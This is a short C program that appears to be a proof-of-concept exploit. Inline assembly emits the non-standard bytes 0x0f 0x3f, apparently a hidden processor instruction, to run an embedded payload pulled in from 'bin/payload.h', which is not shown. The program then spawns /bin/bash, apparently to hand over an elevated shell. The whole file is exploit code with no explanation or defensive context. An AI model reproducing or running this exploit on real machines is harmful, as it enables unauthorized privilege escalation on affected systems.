#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	__asm__ ("movl $payload, %eax");
	__asm__ (".byte 0x0f, 0x3f");
	__asm__ ("payload:");
	#include "bin/payload.h"

	system("/bin/bash");

	return 0;
}
